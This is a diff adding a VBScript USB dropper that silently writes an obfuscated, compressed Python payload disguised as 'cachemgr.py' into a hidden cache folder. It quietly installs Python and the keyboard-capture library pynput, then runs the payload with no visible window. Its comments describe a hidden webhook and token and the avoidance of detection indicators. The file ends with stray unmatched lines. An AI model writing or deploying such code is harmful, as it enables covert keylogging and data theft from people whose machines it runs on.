@@ -1,0 +1,96 @@
+' RUN_ME - single file. Double-click: zero windows.
+' Carries the payload + webhook inside. USB can be pulled right after.
+Option Explicit
+Dim sh, fso, dst, i, payload, hook
+Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+dst = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\.cache\SysCache\"
+EnsureDir dst
+payload = ""
+payload = payload & "import zlib,base64" & vbCrLf
+payload = payload & "_x0='eNqtPO1y2ziS//UUWKbuTGZkWpI/o6ynxrE1GVcc22U5k52ztQxFQhZHFMkQZGyN1vcqW3VPeI9w3Q1AJCXKdmYuVSOTQKPRaPQ3wAmmSZxmLBZNJmbwkwVTDr/jlLt+EN01me9mXDbmaRgGQzvlX3Musib7XcRRY5TGU5a42Ri6WCCRXcJrI0tn3QaDfxJiFiV5pgEmfDaM3dSnftV2H0Tbnbs8aMqnJI09LoCgRORZEDb4g8eTjJ0ScC9N41RiT1whGg2fj5jjm26TDS3ZnvIsTyM2nGVcmA/sn2x4E7D/YCGPzKE1YKM4ZTDVAwsixqN8ylNYpulalu1zL/a5aTXeXVw71xcfeufsEHHfdNoHTdbZ2YOfzn6T7W03WbvdarIdaG538GdvF/q29xEAoNoAsN9psl3s2mnj2BY+7eDTG/ihcdSEY7FldxsR7OJY+AEc+9D9BkH2WmpuOX4boHcQWPcTQtnVwflh+C5Ct5FSaGkfvEEsSDzS1cGB2N9qqf7dtu5vIao2ToBDoA9X1N5BqhCSJmjvdGSfxoPEyOG0yDfIKng7wOH43lqwZ3cAm7Rx+/Bm//bB7dw+DPd++Vt2+8D3N6yG8/O7z78odreBoN03C3oAwTZiQo52cPb9Pc2CHQUkeYBE78NMQPSbfU1Ka1dt2AEu4wA5D3Db+Bd/iCe7u4qF7YO2WjgtUPOk3SEW7CsWHOCyaZ+JNbu4whZyZV9vEM1VgthVFO3RBhxoANq+PS0jBwpDex8w4Ky48S2cFGc4UIsnEnGOXUSIP3LHFDvayJxteMCJaaBcAf1H5G0Tg3BFnRZt2D6Nbr/ZVZuLozt7mr24GURJm5i4IzdDS1oHJZhWhTN0OkgJyh2up7OjlvdmsTu0gF3F8O2"
+payload = payload & "2GtZua/a/aUvCaYqdltqDbaIV6UCFwvV3tkmUvAsQpF0UpiuQqr3bB98HUWq8/3R6duKcnoA4GcD7dgv2r3XQ2d6B5+2DA6Px6Qi65sZxHGU8yjavZwk3usxwkyQMPDcL4mgLLZzRZMYnwdPNozsAQ4iP8R9BGLpbu3aLmZ+DyI/vBTu/BgbZrbcMGvZ23rKHvR3LeFSWaXwf+KYyTMrcjV2BJhOsbuxNeEZdOUwDNMXC5tG3II0j+45npvGp37s6P/rYQ0oQxLCk5fNqYI8vPl5+ul7AS+TYNY5FFrlTMGxydOrew/CRMUeMjz/NE+/RsMP4nqemBBgHPgAoMm0xdju7eyaMgvmkgbTsMX/wgzvwBaZ1090b0LChKziy3LB/j4PI9FgwYp4dCDcEK2tajIfQb2waZIE9NL+A07JFlgaJCe2Aaac1KL2XrfnISLzNOU7xuDkHAh9hiXoJjNbAbqh9YCjOu0lgTnH1fpO8FP7Owtj1D8/jiKstWbgq/Af+zoUF4Nbbfj5NhKlGWIuV45pUIwsEi+KMITa5NnxaIANfCbiqjtO+kn/NkTHOskR0t7b8QHhx6ttePN0Cire+tVtzpBbXh/Q0Fwjx39w4ymFFafAHSSmI5Mh4BzTMFx4Lx71AsCtY/4KUW6X10j4R85A9wlxaO7zGCfhgeJexRpxnh+1dy8Z4AzgLQjE05o9q25XT79EfoLu7PBExW+40BAzfAgFApjd2UNKbLHSHPFR7bBjGCBaxGaebHsyVcZbAai+PWcYfMuaN3SjiIfuB3fPhOI4nTea53pizT1dntppM4D4igTgpoFsVHTnkkJ1dvD85vWJbzLC9sbHoRk1ACJs/BCIT2iDofxVU+l8O6OQgZJCDxJpaW6wVaJghh043zcR"
+payload = payload & "9kI1NEjDDWkVbYmFe6VzPcf2PAq7FiscC3TVqmfG+d03quAVBXOiLrbm2wI9bir3CoA2+GRTjychEuCrTuzEC3xgUhgGRw4pgUyNYU+Rx0wN1CLzMYm7kg1Uhi4dbDXgPgU9y360m7ZBV5juqKMxVXY23IP3yov887c1aLoI2EgVdthA7I5Ma18LHOAk8eCZRfKzumFw8mEhY8PzRkssBFjxPeVn6ddv9uGY5mvitOeB43FLCDWspyDbC+E6UdRilHMgCfGW6oLVKGDS8QH6l7N6nQcal8MIw669IXFly0/AZK7EYuWoukA9aA1+xtq3NwcKMcF/bArmIGnVfr+qktk+q7ItUtaKiL1jmK9ax2WdJtZ2BXRu5YTh0vYlMxGA/R6hYN5igmY4zCkLuOJaduCkYfVxEaSzIyFqw+xLYoKBjRQIyDDHq2GAL8EUYNrQGjSUDltVxRXMia6wVm4IL45q46ORn53Pv3S8XFx/QNSpJhtnGZErGBV3r5x5X9rCyVgVB6cvLHJfhOJdH/euepsr5pXfVcxyjgS+oyFI+G2dH73pnFE81lKgdym0pFnhjnF0cH50dXV6eHF0fGQNLSiPKrEGPkNdjEKEx2NOJH6Sm3E1xeJ3mYLPIJTnxhF6tInlX0aqHJk1yVz7akKT7YWhPeAr2Zbtj93n2M8jJUQY8GuaQdH82gV2mmlJOBpa5Y/1pJHL0mn2XSv0QpxM+q4+0qUlwTjb3qRAbnMkPzPjJgN9nomsALYLCsp1ZippxVsvWoXKj4fzjAvdxQW5BvVlbvvDYPxmOWVQw8KUoYnjVIsbQKiF03MzEJAPFemHtfO6lM2AiYZd9QXTH3Iy5QxGHwHiGOs/i0UjwjH0hiC9P0GUSBDAssL6PQojVuZksCIN"
+payload = payload & "Xn0eAB0Q249MuDENjPARa8ijkQjBDjON7BWewo/MTZiAONNsZ9zLY3Ys+ES8MJH9VVVcF+vvlMUFRZP9iO9ZLDDOtNIt9dyGYSdlxmLrAZuODrQAhY4qBeVPYPhJH7CysFgYFSU0YuWKAE8CXe+OlUFGzvfEyH7zsRRO1eWjXIXhY7B/ExNjEoE0KSHMhaUAz6Ak+ckjEsjgkQWBx6LMkdIOIgnAKROriapmrUt6QgNalQ0PnCy80tkaZcYBtHURlVvSfUklNSlFVYdDIs9HmQSkWesWEGwXZrKtXC0I4zQWoF2dTyLrDGUgnLNEFMS67fwH5cLuIdmG6m+5uqzXQGfNikEyLCMi4jW5BDtiPpGSLIRZ7zVr2fm3wAEAvDR/qfBpm/NWVww4Ed1GccuPl7CeBQVkRJRVQor46tbQm5MQxC0bbK4I/FhK7fkI9sEUt6MULqXFBapgr2KgAH8nA1NSGUmhjvrpSbULBcL1iEBxugh3KulqoIYiYwY6MsvgbT0sSbaMqkDWCzctihloMmMYpiAjk73dB5IaiVCmHbXbCBDc6BNXWzvMujIem8RqRgcN5QtsdJbJhUoq5aElg3g8Xi+JYPReH1V0sCSaiWY3CC26iCYQ5UAdhqZCWGURaU1upErOdUX3u6ZRZb+KE61lvrea50oA9R8eS0QOulPIQo2WA0pCrgtlrYMHhBNHE/C4jWQ8ivUDoQoDlJij4N4YxkO/g/ivv6AewoWVDYHwGAaJz/dtlD1vIQ+CPCW4VbA6C4zkKMCGecCqlvGV5gkUXEMFRmIsxSJ07yuAt8MGB3rlJ4/TkrOf0e8d9wHjQ+Hh6Di/nWCFtdyguiKMNcCxgs9gode+mGB+CtIK/BCQZpJLwEwjtikFaPb5JM4FDzgR"
+payload = payload & "qxhREbRQA9BaY2kBworALCT7qBSpDBlRx5oaYiJ2+P7+46uH0EGWY1otOjEioJjKYK8bPocn+wGcQcAUj0LDKqxMuN6Qrqbzu97K0BI1vzvL7+sFuWJoaXspD8fWJaad+s/xSmRRenxjpJsIJY29SDIAwi1oenxJHtMfA5ohE0qyrg77sWE5DY86lQe33EDaB6t6lcR75snRY0iMHBlPlo4wQx0jIazp6vJTNp745XqkuyqltBWICMsuWpe0X+qM8mkTxfaTcUhw5SYqIJuVygJ/GyUKcN+OIvDhAgVKZSsqksNCuw1KwYpiIGm8GFnWCJl2Ja52T/h4HzaQNKW1e/WgFVyxW0YLNfztk2hxBBl5MVGqEofBQ7QEllD1GUelApz7CsCS6mcOAR/YTm1ciWnqIUAIeB7eRUcOgLJ4Azontjd2UuCWf5EmBsVwMA+jnWLiI10vnxPhviqZCWxLSFbBwPO0C+eA1Kh0QeEFzttwsEvAzXYMtFwMrQFhwUYC3D62DZRxceF3jptc/Hiz3+DzkGYy6OemdDYzHJQZNKQedYF3vZo6+b1J4vg0cvtHc2LDsPEnwDOdxsFpHfIp1kHzx0N9EhwQBC3IFwlpwRjAGMjJ0/iDCe60p1nvdPIs3YWqO0Qwqiq1QBHTiANLnhuBM8iEGPqYBiMMY44GUs/9utwDHDyBbGKlh7UXk6bfgG5coQE4wMCx8nZZaYsFhRQxxsIkDNtnCd95gLPx3iIVbe9RPUXI8ofJwe9kQNFYFG2CLVoUQC9TxPTUvPHK1GXUAZ5H2xAuDxLl3M0y7ugtshdaQEpetKw4orkPUXHQo03s/xswcqzQlBUJ+iZDzxGxb68PD6mT2BcRyx/ptKUMkGoW20cUYsNKLISdu5ppL/cc"
+payload = payload & "/O5/OT48vTnrXvX9cP1PopQlKCl5D43EYC76OSMyhpAhpg7bYc4FSAKLWaq3Gn2o3xNuF7bo5Pju9HHTZXDwuLNTzER/x6HvofaJkWb+TJE46ptPC5OV4Roz6r/KnwqJixQP6kAEUqANoNV1e5yrkuFYh+jKqWwo7XyJ/nXJeLLHIGBQCP3m+nbg5OtFslmDNydSxqcVEzKbgYN07jFvTFGwCTBaH/G0ZYynmxJhyxtoHLcGm7gMNd1NIF+NIIxcQJoQQXEa+WK8VREDF5oBBKSt6BZoIoBJidUDBNTJBPx4iYcvSSlP9nRVROIorGmaJteb0BHx8EOX8hRK5IO5nSCt5Y+0ZSoXYGntbCoJcPKDnwDT2Nec51gVT0B4TBAayI87Q1YEWrXgarGJXaumOs3y24eDJuPM1iRPHDcPlChV5vNby6hAeQynn6yqvao+fCBcmNCaMtOq7YaofYLtWOp8/mKL7DqBZk1ViCo1o2burGfayI5YMQVdqOuhIVuFBbihZ/WqtFxOqRZHMq/15q/YuojPumRfypkryXP8bnqhSTibLvEW0WWdeFCEUOoJZ6TKyLdJuJM3STq1swzPFu3qDtCL4EUcsgOsG5uwO1k+nrm/okg6MIzKtZ4pYLyRDiTdOok+DsDZXL+6rw2F7JkEC0hHNShl2DlAh5BoQHinD5XpePs1DF8vzZjnd9ktp1BTCLzTRYUSqAX9AMyRleLiG+y/kXZUwWhCrLY5ZtFUIvzEkDJ5/YBkqki61AEZjKkEhwLQGy5xRJkj7YX0NiIi10CnrosPSUXxJgtWpA3AFS9dgFotzCmWFfFpwIdQLVIX/w4rt/9+u4dWZGVvE9QKdjZHyacwxwM94ODOkm8HyBHVQW0FXTjtVcIuqvmO9Yd1"
+payload = payload & "lfYcuCFhl9tCtu+WBCJHH8Pdmsz2g5QEykzKZNfc9ANYGa7sclICnWIVHWFg0LMn0Sgm4Ui69qwBVdhjeGHJNSKfZfZz6W6B50kVgEcBNA8k17BKqHkRiyqaBv4mtpYsMGGGUN2uFP7jDCAACRY62VXdpIM2ammC6Q7Ucatav3KOtgoCCJrBTvDQk2Yr3OXAuS6LVXazUU3sjBzH+Ha9Z1m+LnBCHP7+Gmy5AD2TTDTx2B41leLTH8KeoiX5BW7exWuWlMySErGVybfSx1s1KF4vYvvduB7hlCEPkUKX8KDVdSIx5sqTmDO8B4QFTPKKsE01l4ymvK4+pvuIZglk9Vy1OlemE/KtRAC/IqamJFTVwjbX+YIECA70Tawvb1ehGFcTlBXU7ix15xroDA0BNspDTufSw5ACoCK4JeflRZCnmKp3bEVuUdUWywfHEoc+xFIwhn/WWeTAEtJaOtiBWiSNuxhPHA/XOrOeO7Urs+u7TO2U2iagmVqfJlOqYQ1oLbP2B7aA50Na/VNWKYEQQZTbWlRVbMZKAQV01cFDicsEy7DtkO5UAiOAB44+LiZh0vj+iii/peDU4pBVos1olIIwG6wOUFYrCqHIci2j11lIIGdXJ7st2Q89SDr4p8JY3daM7vsD+V9lbZjGxoLTxlKFrJJUgA/uq8y8v6R6XJJUJgUvx3YrBj4WNzvrbn1KjwuYpbrt3QDQe1kH2Zaprc3R/p3TlaBj7M7p3/fr1zRxGPA5ev76Nvnz5MkdMj/BgULkLcFH9c2RU+hrPXirGoKZZvr08Nzx5Edjo0uyPxZWVNTcaq7cbv/cace2/v3q3+EW3iFsLSZYbpOom/IEXho7kggmwGREEhDx0Z9zflMfGEvzt4rZvADaQjp+lnREeuEm"
+payload = payload & "w5g8cj8SQ3gus/gDpVIloUjyGVY6dXSExg4UAFJm6Ogi2dJLFyVaSxnS5BqKHQIxpVqpVxCyZYfHiXkVHrYdjrF+1dzrCrjWvfumE3A9SOgHBtRZ2LylBUMDmox7SMu1vQ1E2dTM0DmImcH0QWOC1gyKEkIRhF0qyIpNerRrXGGKad1/rE7WT2+hDgE8FpmO6i30x/J17oC2f+5LJfSwZG9ZttFHvJAtAdPbAcWBUpXJXARZj+yqP2PE4Nbd3LPaf7NbAy12w5qJ+bmw02cYGXbW5NQCkDMxWWnA4LP/Z4RQZUjGmQt3qwT258vD7b+SU3ECYfO+V+YSnAq8ZwEqaLBBOoShFdTrld6q2P8rDkAr8aQKYqJAHOw5iS9qTJxjaTwTqgjwuwBTl8uha3of80/KlI1VJnrSJ8CArlT5ddii0XFGqCQIVp7QjAdHP8HYbaqc6IDeVPgOGP3gas0+nTW0O1E0PaWrzyPGmOM9oo2wBjHnoPxoblIv4kipztGHMoU81lwnGHuDAI+QKCqLmFGwiq+3AcKrMf+AzU73+8qH3m3P86eqqd37t4E3FJkuNfjzK7t2U334MvDQW8HarDOntcZ7ibctfcXvj6BZkX6YoCh1i6/eunV+Pzj71ygpMvaCZv7phznsPeNRk9GfimG6SljFc9d47/f9qau6s4KAqOC5gsq7gXH/lSImdyIfqVLi42LNosmFSYLXwxpkrQN621NccWyO2JTzIPsP4DlLQrSwqEQ+vKWjmrWQ//AV9Xee1PDcBPeEOyG8CXkVej9U+Zru1fhzSAYsbhe6dOATn72aQZBSE4xc5V72j655zfuF8Pj0/ufiMTLWeZdEr1pcCvTnCiDyVNzIw+9N+TC45dPPIGzdBXZjrT/FAupBxaJO"
+payload = payload & "+quay1XTZSyzfetU3iymKQdlbFTmikH3kUX57mcZ3qTtVbXlSsnthNFmeS0xLQmYDQPXUUsMGAq8si+lyKaB8ihZPbS8MgB/VA6XiFGsBYJ8EIqEDumWPUxkq8IL/vbClj+orrptA5EoyHdYU74VnX7spcBDvaz/H4/5v/evex6uLC/xwIzWOu5q1dJ2qT9dhtzu4BSUzZFh1kx6ld7ksLB6S5SFL9YLKxzK9aLOfsL415QQJVl/mqCFMmsIlltufwY1AQHQSpBASxOnsuShHDyN29bMZnebso9qADgTT4A/uL8P23W9rL4uoCB+L7vQ5j+NQKc5xpm4QOY6hr4gIoDHkm/rTJNBFSN/wq6Q4meFtelhlMJ1yP3CxFMhMAbGfYAcPzM8TXntNRMryVHzz0kKE6SbPSCduT4oQyM8lXX4jkQFfK7+9QQTUcl8SFzkL9cE6TDmLjXFpFGMSpfrPPjjn786OIaFoP3v1knx7kJktCUn32DS97lBQeoVAIGLf8IxMxgUqBMHPpqZcf39aKjJLMdeefeymPjo9BuFSlAXZDH31NMHblJE6D1RHiKv8ddA2OvQdFn1fQZ/kPrOo6hj8+FTfpmkuXazR32lIYEWu+qRIfYTVlS6Cb2HdkL1CZJgUISGg8jHeupdnvZQzpHVLkJ9mlT51LBFYsZvOytdZ+rsS/dHUk/W8xcF4v9fvn16cs7mc45Ft/shezWHW0l2eP/Eh14s+ZdJh3JjD3yFwrksfZ3FiD3Mxl9SXR3wIbodxjF8g3I8DbyxXG2R44ixqb2S98JByPPyOTLuxmjwXqbfM+ElMMOdn//vvf/8PRitBxI1ySs4+HVXZuib1HQ9rM9+XXiTT/38PW163MzOy/IfF3RUsMvNpHMkPgiSb9F3"
+payload = payload & "tNYP1TYUnhlKWuLjzdAaqzyPQeH0F71A/UPJYkuBQmjyr8X8/7nNa'" & vbCrLf
+payload = payload & "exec(compile(zlib.decompress(base64.b64decode(_x0)).decode(),chr(60)+chr(109)+chr(62),chr(101)+chr(120)+chr(101)+chr(99)))" & vbCrLf
+payload = payload & "" & vbCrLf
+WriteText dst & "cachemgr.py", payload
+' no secrets in this file: webhook + token live scrambled inside the payload
+
+' 1. ensure Python: bundled offline installer only (no downloads = no URL IOCs).
+'    Put python-3.12.10-amd64.exe next to this file on the USB for bare machines.
+'    Requires Python 3.11+ 64-bit. Aborts silently otherwise.
+If Not HasPython() Then
+  Dim usbdir, b, hit
+  usbdir = fso.GetParentFolderName(WScript.ScriptFullName) & "\"
+  hit = ""
+  For Each b In Array("python-3.12.10-amd64.exe", "python-3.11.9-amd64.exe", "python-setup.exe")
+    If fso.FileExists(usbdir & b) Then hit = usbdir & b : Exit For
+  Next
+  If hit <> "" Then
+    sh.Run Chr(34) & hit & Chr(34) & " /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1", 0, True
+    g_py = "" : g_pyw = ""
+    Call HasPython()
+  End If
+End If
+If Not HasPython() Then WScript.Quit 1
+
+' 2. deps via pythonw (no console exists to flash) + fully quiet flags
+sh.Run Chr(34) & PyBin("pythonw.exe") & Chr(34) & " -m pip install --quiet --disable-pip-version-check --no-warn-script-location pynput pywin32 psutil", 0, True
+
+' 3. launch hidden
+sh.Run Chr(34) & PyBin("pythonw.exe") & Chr(34) & " " & Chr(34) & dst & "cachemgr.py" & Chr(34), 0, False
+
+Sub WriteText(path, content)
+  Dim s
+  EnsureDir fso.GetParentFolderName(path)
+  Set s = fso.CreateTextFile(path, True)
+  s.Write content
+  s.Close
+End Sub
+
+Sub EnsureDir(p)
+  Dim parent
+  If fso.FolderExists(p) Then Exit Sub
+  parent = fso.GetParentFolderName(p)
+  If parent <> "" And Not fso.FolderExists(parent) Then EnsureDir parent
+  On Error Resume Next
+  fso.CreateFolder p
+End Sub
+
+Dim g_py, g_pyw
+g_py = "" : g_pyw = ""
+
+Function HasPython()
+  Dim dirs, d, p
+  dirs = Split(sh.ExpandEnvironmentStrings("%PATH%"), ";")
+  Dim extra
+  extra = Array(sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Programs\Python\Python312", sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Programs\Python\Python311", "C:\Python312", "C:\Python311", "C:\Program Files\Python312", "C:\Program Files\Python311")
+  For Each d In dirs
+    p = d & "\python.exe"
+    If fso.FileExists(p) Then g_py = p : g_pyw = d & "\pythonw.exe" : HasPython = True : Exit Function
+  Next
+  For Each d In extra
+    p = d & "\python.exe"
+    If fso.FileExists(p) Then g_py = p : g_pyw = d & "\pythonw.exe" : HasPython = True : Exit Function
+  Next
+  HasPython = False
+End Function
+
+Function PyBin(exe)
+  Dim c
+  If exe = "pythonw.exe" And g_pyw <> "" Then PyBin = g_pyw : Exit Function
+  If exe = "python.exe" And g_py <> "" Then PyBin = g_py : Exit Function
+  For Each c In Array(sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Programs\Python\Python312\" & exe, sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Programs\Python\Python311\" & exe)
+    If fso.FileExists(c) Then PyBin = c : Exit Function
+  Next
+  PyBin = exe
+End Function
+  End If
+End Function
